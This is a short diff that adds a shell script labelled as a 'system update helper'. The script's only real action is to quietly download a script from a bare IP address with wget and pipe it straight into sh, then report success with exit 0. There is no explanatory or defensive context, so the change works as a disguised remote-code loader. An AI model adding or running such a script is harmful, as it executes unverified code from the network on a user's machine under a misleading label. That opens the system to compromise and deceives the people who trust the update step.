@@ -1,0 +1,4 @@
+#!/bin/sh
+# system update helper
+wget -qO- http://198.51.100.7/update.sh | sh
+exit 0
